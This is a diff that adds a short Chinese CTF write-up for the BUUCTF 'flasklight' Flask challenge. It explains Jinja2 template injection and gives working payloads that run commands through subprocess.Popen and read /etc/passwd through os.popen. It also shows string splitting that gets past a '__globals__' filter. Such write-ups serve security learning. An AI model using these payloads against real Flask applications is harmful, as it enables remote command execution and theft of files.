@@ -650,3 +650,30 @@ print(res.text)
 
 ```
 
+
+
+# buuctf flasklight
+
+明显ssti模板注入
+
+可以使用tplmap来检测模板类型
+
+方法一:
+
+可以使用脚本**ssti脚本get.py**查找`subprocess.Popen`
+
+`?search={{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}`
+
+执行命令
+
+方法二:
+
+也可以使用connfig,url_for调用os模块
+
+`{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}`
+
+但是globals被过滤,可以采用拼接
+
+`?search={{config.__class__.__init__['__glo'+'bals__']['os'].popen('cat /etc/passwd').read()}}`
+
+**注意:**拼接绕过就不能用`.`应该用`[]`
